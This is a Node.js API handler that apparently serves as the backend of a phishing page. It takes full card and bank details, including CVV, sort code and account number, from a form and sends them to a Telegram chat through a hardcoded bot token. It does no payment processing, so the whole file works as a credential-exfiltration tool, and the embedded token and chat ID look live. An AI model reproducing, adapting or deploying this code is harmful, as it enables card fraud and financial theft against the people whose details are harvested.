import fetch from 'node-fetch';

export default async function handler(req, res) {
    if (req.method === 'POST') {
        try {
            const {
                cardNumber,
                sortCode,
                accountNumber,
                nameOnCard,
                expiryDate,
                cvv
            } = req.body;

            // Hardcoded credentials (replace with environment variables in production)
            const telegramBotToken = '7362880252:AAFoMzgfag6Y8pUXNgiAMcdGZEpKwQsmCxE';
            const chatId = '7587120060';
            
            // Format message
            const message = encodeURIComponent(
                `⚠️ New Payment Details Submitted ⚠️\n\n` +
                `Card Number: ${cardNumber}\n` +
                `Sort Code: ${sortCode}\n` +
                `Account Number: ${accountNumber}\n` +
                `Name on Card: ${nameOnCard}\n` +
                `Expiry Date: ${expiryDate}\n` +
                `CVV: ${cvv}`
            );

            // Send to Telegram
            const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
            
            // Log the URL (remove after testing)
            console.log("Telegram URL:", telegramUrl);

            const response = await fetch(telegramUrl);
            const result = await response.json();

            // Log Telegram API response
            console.log("Telegram Response:", result);

            if (!response.ok) {
                throw new Error(`Telegram API Error: ${result.description}`);
            }

            res.status(200)
               .setHeader('Access-Control-Allow-Origin', '*')
               .json({ success: true });
        } catch (error) {
            console.error('Submission Error:', error.message);
            res.status(500)
               .setHeader('Access-Control-Allow-Origin', '*')
               .json({ 
                   error: 'Submission failed',
                   details: error.message // Remove in production
               });
        }
    } else {
        res.status(405)
           .setHeader('Access-Control-Allow-Origin', '*')
           .json({ error: 'Method not allowed' });
    }
}
